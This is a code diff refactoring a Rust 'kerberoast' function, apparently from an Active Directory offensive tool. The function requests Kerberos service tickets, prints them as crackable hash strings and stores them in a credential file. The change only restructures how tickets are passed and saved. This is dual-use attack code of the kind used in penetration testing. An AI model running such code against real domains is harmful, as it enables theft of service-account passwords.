@@ -18,36 +18,33 @@ pub fn kerberoast(
     crack_format: CrackFormat,
 ) -> Result<()> {
     let username = user.name.clone();
-    let (mut krb_cred_plain, cred_format, ticket, krb_cred_info) =
-        get_user_tgt(
-            user.clone(),
-            creds_file,
-            user_key,
-            transporter,
-            cred_format,
-        )?;
+    let (mut krb_cred_plain, cred_format, tgt) = get_user_tgt(
+        user.clone(),
+        creds_file,
+        user_key,
+        transporter,
+        cred_format,
+    )?;
 
     for service in services {
         match request_tgs(
             user.clone(),
             service.clone(),
-            &krb_cred_info,
-            ticket.clone(),
+            tgt.clone(),
             transporter,
         ) {
             Err(err) => match &err {
                 _ => return Err(err),
             },
-            Ok((tgs, krb_cred_info_tgs)) => {
+            Ok(tgs) => {
                 let crack_str = tgs_to_crack_string(
                     &username,
                     &service,
-                    &tgs,
+                    &tgs.ticket,
                     crack_format,
                 );
                 println!("{}", crack_str);
-                krb_cred_plain.cred_part.ticket_info.push(krb_cred_info_tgs);
-                krb_cred_plain.tickets.push(tgs);
+                krb_cred_plain.push(tgs);
             }
         }
     }
